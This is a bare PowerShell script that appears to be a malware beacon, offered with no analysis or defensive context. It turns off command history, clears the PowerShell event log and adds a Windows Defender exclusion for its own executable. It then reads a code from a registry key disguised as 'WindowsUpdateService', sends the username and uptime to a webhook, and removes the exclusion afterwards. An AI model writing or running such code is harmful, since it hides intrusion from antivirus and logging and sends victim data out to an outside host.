$webhookUrl = "from acquisitons sections, PingBot"
$AvailableTls = [enum]::GetValues('Net.SecurityProtocolType') | Where-Object { $_ -ge 'Tls12' }
foreach ($tlsProtocol in $AvailableTls) {[Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor $tlsProtocol}
Set-PSReadLineOption -HistorySaveStyle SaveNothing | Out-Null
Clear-EventLog "Windows Powershell"
$LogEngineLifecycleEvent = $false | Out-Null
[void]$LogEngineLifecycleEvent
$scriptPath = $MyInvocation.MyCommand.Path
$exePath = "$scriptPath.exe"
$Exclusions = Get-MpPreference | Select-Object -ExpandProperty ExclusionPath
if ($Exclusions -notcontains $exePath) {
    Add-MpPreference -ExclusionPath $exePath -ErrorAction SilentlyContinue
}
$regPath = "HKLM:\Software\WindowsUpdateService"
$code = (Get-ItemProperty -Path $regPath).Code
$uptime = (Get-CimInstance -ClassName Win32_OperatingSystem).LastBootUpTime
$currentTime = Get-Date
$elapsedTime = $currentTime - $uptime
$elapsedTimeFormatted = "{0:D2} days, {1:D2} hours, {2:D2} minutes" -f $elapsedTime.Days, $elapsedTime.Hours, $elapsedTime.Minutes, $elapsedTime.Seconds
$username= ( ( Get-CIMInstance -class Win32_ComputerSystem | Select-Object -ExpandProperty username ) -split '\\' )[1]
$message = "**$code** :: **$username** :: **$elapsedTimeFormatted**"
$jsonPayload = @{ content = $message }
$jsonString = $jsonPayload | ConvertTo-Json
Invoke-RestMethod -Uri $webhookUrl -Method POST -Body $jsonString -ContentType "application/json"
Remove-MpPreference -ExclusionPath $exePath -ErrorAction SilentlyContinue